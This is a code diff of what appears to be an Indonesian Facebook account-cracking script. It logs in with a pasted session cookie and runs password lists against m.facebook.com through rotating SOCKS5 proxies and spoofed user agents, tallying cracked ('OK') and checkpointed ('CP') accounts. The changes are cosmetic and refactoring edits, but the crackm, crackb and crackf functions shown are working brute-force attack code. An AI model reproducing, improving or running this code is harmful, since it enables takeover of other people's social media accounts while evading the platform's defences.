@@ -241,7 +241,7 @@ def login_bas():
 		os.system('clear')
 		banner()
 		ses = requests.Session()
-		cookie=input(f'└── Cookies : ')
+		cookie=input(f'└── Cookies :{H} ')
 		cookies = {'cookie':cookie}
 		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
 		req = ses.get(url,cookies=cookies)
@@ -466,7 +466,7 @@ def dump_massal():
 	
 #
 def setting():
-	cetak(panel(f'\t                  [cyan] Setting Id',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'\t                  [cyan] Setting Idz',width=70,title=f"",style=f"{warna_kolor}"))
 	cetak(panel(f' 01. Akun Lama\n 02. Akun Baru\n 03. Akun Acak',width=70,title=f"",style=f"{warna_kolor}"))
 	__baz__gege__ = input(f'Pilih :{x} ')
 	if __baz__gege__ in ['1','01']:
@@ -522,8 +522,11 @@ def setting():
 	cetak(panel(f' Ingin Menambahkan User Agent Y/t',width=70,title=f"",style=f"{warna_kolor}"))
 	uat = input(f'Pilih : ')
 	if uat in ['y','Ya','ya','Y']:
-		ualuh.append('ualu');bz = input(f'└── Ugent : ');ualu.append(bz)
-	else:ualuh.append('no')
+		ualuh.append('ya')
+		bz = input(f'└── Ugent : ')
+		ualu.append(bz)
+	else:
+		ualuh.append('no')
 	wordlist()
 	
 #
@@ -567,19 +570,22 @@ def wordlist():
 			else:
 				pool.submit(crackf,idf,pwv)
 	print('')
-	print(f'AKUN OK : {h}%s '%(ok))
-	print(f'AKUN CP : {k}%s{x} '%(cp))
+	print(f'└── akun ok : {h}%s '%(ok))
+	print(f'{x}└── akun cp : {k}%s{x} '%(cp))
 	
 #
 def crackm(idf,pwv):
 	global loop,ok,cp
+	bi = random.choice(['\33[m'])
+	pers = loop*100/len(id2)
+	fff = '%'
 	prog.update(des,description=f'crack [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
 	prog.advance(des)
-	ua = random.choice(ugenzm)
+	ua = random.choice(ugenm)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-			if 'ualu' in ualuh: ua = ualu[0]
+			if 'ya' in ualuh: ua = ualu[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -611,13 +617,16 @@ def crackm(idf,pwv):
 #
 def crackb(idf,pwv):
 	global loop,ok,cp
+	bi = random.choice(['\33[m'])
+	pers = loop*100/len(id2)
+	fff = '%'
 	prog.update(des,description=f'crack [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
 	prog.advance(des)
-	ua = random.choice(ugenzb)
+	ua = random.choice(ugenb)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-			if 'ualu' in ualuh: ua = ualu[0]
+			if 'ya' in ualuh: ua = ualu[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -662,13 +671,16 @@ def crackb(idf,pwv):
 #
 def crackf(idf,pwv):
 	global loop,ok,cp
+	bi = random.choice(['\33[m'])
+	pers = loop*100/len(id2)
+	fff = '%'
 	prog.update(des,description=f'crack [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
 	prog.advance(des)
-	ua = random.choice(ugenzf)
+	ua = random.choice(ugenf)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-			if 'ualu' in ualuh: ua = ualu[0]
+			if 'ya' in ualuh: ua = ualu[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
